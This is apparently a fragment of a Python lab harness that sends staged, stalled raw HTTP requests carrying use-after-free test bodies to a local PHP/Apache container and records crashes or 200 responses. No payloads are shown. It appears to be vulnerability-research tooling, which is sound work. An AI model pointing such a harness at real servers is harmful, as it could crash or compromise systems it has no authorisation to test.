#!/usr/bin/env python3
"""Lab harness: fire UAF bodies against local php:8.5.11-apache, report crash/200."""
import socket, sys, time
def send_raw(host, port, head, phase1, tail, stall):
    s = socket.create_connection((host, port), timeout=20)
    s.sendall(head + phase1)
    time.sleep(stall)
    try:
        s.sendall(tail)
    except (BrokenPipeError, ConnectionResetError) as e:
        s.close(); return None, f'SEND-TAIL-FAILED: {e}'
    s.settimeout(20)
    chunks = []
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            chunks.append(d)
    except socket.timeout: pass
    s.close()
    return b''.join(chunks), None
